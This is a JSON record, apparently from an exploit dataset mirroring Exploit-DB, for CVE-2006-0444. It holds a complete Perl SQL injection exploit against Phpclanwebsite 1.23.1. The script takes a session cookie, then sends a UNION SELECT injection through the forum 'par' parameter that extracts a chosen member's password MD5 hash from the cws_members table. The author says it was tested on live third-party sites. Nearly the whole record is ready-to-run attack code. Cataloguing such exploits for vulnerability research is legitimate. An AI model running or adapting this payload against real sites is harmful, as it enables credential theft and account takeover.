{
  "id": "1453",
  "title": "Phpclanwebsite 1.23.1 - SQL Injection",
  "cve": "CVE-2006-0444",
  "vuln_type": "sqli",
  "code": "#!perl\r\n#Phpclanwebsite 1.23.1 SQL injection exploit by matrix_killer\r\n#Greets to all omega-team members[and specially to EcLiPsE] and also to h4cky0u[h4cky0u.org], Alpha-Fan, Chameleon and all my friends\r\n#The exploit was tested on phpclan's website and it worked + my local server and on ra4ev.com\r\n#But on versions below 1.23.1 it doesn't seem to work\r\n\r\nuse IO::Socket;\r\n$host = $ARGV[0];\r\n$path = $ARGV[1];\r\n$topic = $ARGV[2];\r\n$id = $ARGV[3];\r\n\r\nif (@ARGV < 4) {\r\n  print \"---------------------------------------------------------\\n\";\r\n  print \"-- Phpclanwebsite 1.23.1 SQL Injection sploit --\\n\";\r\n  print \"-- (C)oded by matrix_killer --\\n\";\r\n  print \"-- Contact: matrix_k\\@abv.bg || matrix_killer\\@ra4ev.com --\\n\";\r\n  print \"-- Usage: $0 [host] [path] [topic] [id] --\\n\";\r\n  print \"-- Ex: $0 127.0.0.1 cws 2 2 --\\n\";\r\n  print \"---------------------------------------------------------\\n\";\r\n  exit();\r\n}\r\n$sock = IO::Socket::INET->new(PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\") || die \"Can't establish a connection\\n\";\r\n\r\nprint $sock \"GET /$path/index.php?page=forum&func=post&par=$topic HTTP/1.1\\n\";\r\nprint $sock \"User-Agent: Mozilla/4.0\\n\";\r\nprint $sock \"Host: $host\\n\\n\";\r\nwhile ($asd = <$sock>) {\r\n        if ($asd =~ /Set-Cookie:/gi) {\r\n             $asd =~ /cuser_id=([a-zA-Z0-9]{32})/;\r\n             $cookie = $1;\r\n        }\r\n}\r\n$sock->close;\r\n\r\n$socket = IO::Socket::INET->new(PeerAddr => \"$host\",PeerPort => \"80\",Proto => \"tcp\") || die \"Can't establish a connection\\n\";\r\nprint \"-- Connection Established --\\n\";\r\n\r\nprint $socket \"GET /$path/index.php?page=forum&func=post&par=$topic%20UNION%20SELECT%20null,null,null,null,null,null,password,null%20FROM%20cws_members%20WHERE%20member_id=$id/* HTTP/1.0\\n\";\r\nprint $socket \"User-Agent: Mozilla/4.0\\n\";\r\nprint $socket \"Host: $host\\n\";\r\nprint $socket \"Cookie: cuser_id=$cookie; chitcounter=hitcounter\\n\\n\";\r\nprint \"-- Waiting... --\\n\";\r\n\r\nwhile($ans = <$socket>) {\r\n       if ($ans =~ /([a-zA-Z0-9]{32})/){\r\n            if ($ans =~ /cookie/i) {\r\n                 next;\r\n            }\r\n            print \"\\nmember id: $id \\n\";\r\n            print \"md5 hash: $1 \\n\";\r\n            exit;\r\n       }\r\n}\r\nprint \"Sorry there s33ms to be a problem\\n\";\r\n\r\n# milw0rm.com [2006-01-25]",
  "url": "https://www.exploit-db.com/exploits/1453"
}